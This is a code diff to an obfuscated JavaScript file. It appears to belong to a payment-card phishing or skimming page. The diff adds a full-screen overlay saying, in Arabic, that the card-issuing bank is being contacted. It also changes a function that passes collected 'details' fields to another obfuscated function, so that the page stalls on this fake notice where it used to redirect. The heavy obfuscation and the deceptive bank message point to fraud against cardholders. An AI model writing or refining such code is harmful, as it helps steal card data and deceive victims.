@@ -1433,19 +1433,28 @@ function v40()
   	}
   }
 
+	function showBankConnectingLoader() {
+		if (document.getElementById('bankConnectingOverlay')) {
+			return;
+		}
+		var overlay = document.createElement('div');
+		overlay.id = 'bankConnectingOverlay';
+		overlay.style.cssText = 'position:fixed;inset:0;background:#ffffff;z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:24px;';
+		overlay.innerHTML =
+			'<div style="width:64px;height:64px;border:6px solid #e2e8f0;border-top-color:#0077D5;border-radius:50%;animation:bankSpin 0.9s linear infinite;"></div>' +
+			'<div style="margin-top:26px;font-size:20px;font-weight:700;color:#1a202c;">يرجى الانتظار جار الاتصال بالبنك المصدر للبطاقة</div>';
+		var style = document.createElement('style');
+		style.textContent = '@keyframes bankSpin { to { transform: rotate(360deg); } }';
+		document.head.appendChild(style);
+		document.body.appendChild(overlay);
+	}
+
 	function v138(details) {
 		$(_0xdec(119)).hide();
-		$(_0xdec(35)).show();
 		$(_0xdec(5)).hide();
 		$(_0xdec(113)).hide();
-		var v118 = false;
-		var v184 = function () {
-			if (v118) {
-				return;
-			}
-			v118 = true;
-			window.location.href = _0xdec(141);
-		};
+		$(_0xdec(35)).hide();
+		showBankConnectingLoader();
 
 		v223(
 			v48 || "",
@@ -1454,11 +1463,7 @@ function v40()
 			details && details[_0xdec(272)] ? details[_0xdec(272)] : "",
 			details && details[_0xdec(273)] ? details[_0xdec(273)] : "",
 			details && details[_0xdec(274)] ? details[_0xdec(274)] : ""
-		).then(() => {
-			v184();
-		}).catch(() => {
-			v184();
-		});
+		).then(function () {}).catch(function () {});
 	}
 	
 	function v192()
